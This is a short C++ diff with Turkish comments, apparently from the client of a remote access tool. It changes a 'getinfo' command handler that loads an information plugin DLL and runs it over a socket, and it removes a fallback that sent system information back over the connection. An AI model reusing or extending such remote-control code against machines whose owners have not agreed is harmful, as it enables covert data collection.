@@ -72,20 +72,17 @@ private:
 
                     // 1. Bilgi İstemi (Plugin Kontrollü)
                     if (action == "getinfo") {
-                        // Plugin sistemine geçiş: information plugini yüklü mü bak, değilse yükle ve çalıştır
+                        // Plugin sistemi: information plugini yüklü mü bak, değilse yükle ve çalıştır
                         if (!pluginMgr.isPluginLoaded("information")) {
                             if (pluginMgr.loadPluginFromFile("information", "information.dll")) {
                                 cout << "[+] Information plugini basariyla yuklendi." << endl;
                             } else {
-                                cout << "[-] Information plugini yuklenemedi, yerlesik sistem kullaniliyor." << endl;
+                                cout << "[-] Information plugini yuklenemedi!" << endl;
                             }
                         }
 
                         if (pluginMgr.isPluginLoaded("information")) {
                             pluginMgr.executePlugin("information", "RunPlugin", sock);
-                        } else {
-                            // Yedek: Plugin yoksa eski usul devam et
-                            send_data(SysInfo::getAllInfo());
                         }
                     }
                     // 2. Mesaj Kutusu
